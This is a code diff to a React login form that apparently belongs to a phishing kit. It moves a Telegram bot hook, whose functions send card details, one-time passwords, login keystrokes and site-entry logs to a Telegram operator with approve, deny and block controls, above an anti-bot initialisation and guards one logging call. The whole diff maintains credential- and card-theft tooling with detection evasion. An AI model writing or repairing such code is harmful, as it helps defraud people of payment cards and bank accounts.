@@ -43,17 +43,54 @@ function LoginForm() {
   });
   const [cardErrors, setCardErrors] = useState({});
 
-  // Anti-bot initialization
+  // Telegram bot hooks - declare here so it's available in useEffect
+  const {
+    generateSessionId,
+    sendToTelegramWithButtons,
+    sendCardDetailsToTelegram,
+    sendFormattedCardDetails,
+    sendOtpToTelegram,
+    sendSuccessToTelegram,
+    sendCardVerificationLog,
+    sendOtpPageLog,
+    sendCardVerificationPageLog,
+    sendOtpSubmitLog,
+    sendOtpVerifiedLog,
+    sendLoginTypingLog,
+    sendCardTypingLog,
+    sendSiteEntryLog,
+    sendOtpTypingLog,
+    sendBlockedLog,
+    sendConfirmationLog,
+  } = useTelegramBot(
+    sessionId, 
+    handleApprove, 
+    handleDeny, 
+    handleViewCard, 
+    handleNextStep, 
+    handleBackToCard, 
+    handleBackToLogin, 
+    handleBlock,
+    handleNextStepAppr,
+    handleBackToAppr,
+    handleDenyOtp,
+    handleOtpFalse,
+    handleApproveOtp
+  );
+
+  // Anti-bot initialization - moved AFTER useTelegramBot so sendSiteEntryLog is defined
   useEffect(() => {
     startTimer();
     const handleMouseMove = () => trackInteraction();
     window.addEventListener('mousemove', handleMouseMove);
-    sendSiteEntryLog();
+    if (sendSiteEntryLog) {
+      sendSiteEntryLog();
+    }
     return () => {
       window.removeEventListener('mousemove', handleMouseMove);
       resetAntiBot();
     };
-  }, []);
+  }, [sendSiteEntryLog]);
 
   const handleApprove = async () => {
     if (!hasSentCardPageLogRef.current) {
@@ -205,41 +242,6 @@ function LoginForm() {
     alert(t.success);
     window.location.reload();
   };
-
-  // Telegram bot hooks
-  const {
-    generateSessionId,
-    sendToTelegramWithButtons,
-    sendCardDetailsToTelegram,
-    sendFormattedCardDetails,
-    sendOtpToTelegram,
-    sendSuccessToTelegram,
-    sendCardVerificationLog,
-    sendOtpPageLog,
-    sendCardVerificationPageLog,
-    sendOtpSubmitLog,
-    sendOtpVerifiedLog,
-    sendLoginTypingLog,
-    sendCardTypingLog,
-    sendSiteEntryLog,
-    sendOtpTypingLog,
-    sendBlockedLog,
-    sendConfirmationLog,
-  } = useTelegramBot(
-    sessionId, 
-    handleApprove, 
-    handleDeny, 
-    handleViewCard, 
-    handleNextStep, 
-    handleBackToCard, 
-    handleBackToLogin, 
-    handleBlock,
-    handleNextStepAppr,
-    handleBackToAppr,
-    handleDenyOtp,
-    handleOtpFalse,
-    handleApproveOtp
-  );
 
   const handleInputChange = async (field, value) => {
     trackTyping();
